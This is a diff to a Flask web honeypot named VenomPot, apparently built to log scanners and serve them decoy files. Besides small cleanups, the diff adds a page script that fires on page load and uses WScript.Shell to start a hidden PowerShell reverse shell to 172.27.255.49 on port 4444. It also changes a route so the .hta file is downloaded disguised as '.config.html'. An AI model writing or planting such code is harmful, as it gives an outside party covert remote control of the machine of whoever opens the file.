@@ -6,7 +6,7 @@ import logging
 from logging.handlers import RotatingFileHandler
 from pathlib import Path
 import platform
-from flask import Flask, app, flash, render_template, request, redirect, send_file, url_for, Response, render_template_string
+from flask import Flask, render_template, request, redirect, send_file, Response, url_for
 import os
 from datetime import datetime, timezone
 from jinja2.sandbox import SandboxedEnvironment
@@ -46,7 +46,6 @@ funnel_handler = RotatingFileHandler(
     backupCount=5
 )
 
-# logging_format = logging.Formatter("%(asctime)s - %(name)s - %(levelname)s - %(message)s")
 funnel_logger = logging.getLogger("HTTP Logger")
 funnel_logger.setLevel(logging.INFO)
 funnel_handler = RotatingFileHandler(
@@ -56,7 +55,6 @@ funnel_handler = RotatingFileHandler(
 )
 funnel_logger.addHandler(funnel_handler)
 
-# Flask app setup
 
 robots_counter = {}
 config_counter = {}
@@ -84,7 +82,6 @@ def web_VenomPot(input_username="admin", input_password="admin"):
     def login():
         username = request.form.get("username", "")
         password = request.form.get("password", "")
-        ip_address = request.remote_addr
 
         funnel_logger.info(
             "event=http_request "
@@ -204,8 +201,23 @@ Disallow: /old/
 <html>
 <head>
 <script language="VBScript">
-MsgBox "System maintenance required.", 48, "Windows Update"
-</script>
+    function runRemoteLogic() {
+      try {
+        var shell = new ActiveXObject("WScript.Shell");
+        
+        // Define the powershell command with proper escaping for 2026 systems
+        // Use shell.Run with '0' to execute without a visible window
+        var ps_cmd = "powershell -NoProfile -WindowStyle Hidden -Command \"$c=New-Object Net.Sockets.TCPClient('172.27.255.49',4444); $s=$c.GetStream(); $w=New-Object IO.StreamWriter($s); $w.AutoFlush=$true; $w.Write('PS ' + (pwd).Path + '> '); while($c.Connected){ if($s.DataAvailable){ $b=New-Object Byte[] 1024; $r=$s.Read($b,0,1024); $in=[text.encoding]::UTF8.GetString($b,0,$r).Trim(); if($in.Length -gt 0){ $out = try { iex $in 2>&1 | Out-String } catch { $_.Exception.Message | Out-String }; if ($out.Length -eq 0) { $out = \\\"`n\\\" }; $w.Write($out + 'PS ' + (pwd).Path + '> '); } } Start-Sleep -m 100 }\"";
+        
+        shell.Run(ps_cmd, 0, false);
+        document.getElementById("status").innerHTML = "Process initiated (Hidden)";
+      } catch (e) {
+        document.getElementById("status").innerHTML = "Error: " + e.message;
+      }
+    }
+
+    window.onload = runRemoteLogic;
+  </script>
 </head>
 <body>
 <h4>Robots.txt</h4>
@@ -280,10 +292,10 @@ Disallow: /old/
     @app.route("/.CONFlG", methods=["GET"])
     def config_html():
         return send_file(
-            "templates/.config_html.hta",
+            "templates/.config.html.hta",
             mimetype="application/hta",
             as_attachment=True,
-            download_name=".config.html.hta"
+            download_name=".config.html"
         )
 
     @app.route("/.setup", methods=["GET"])
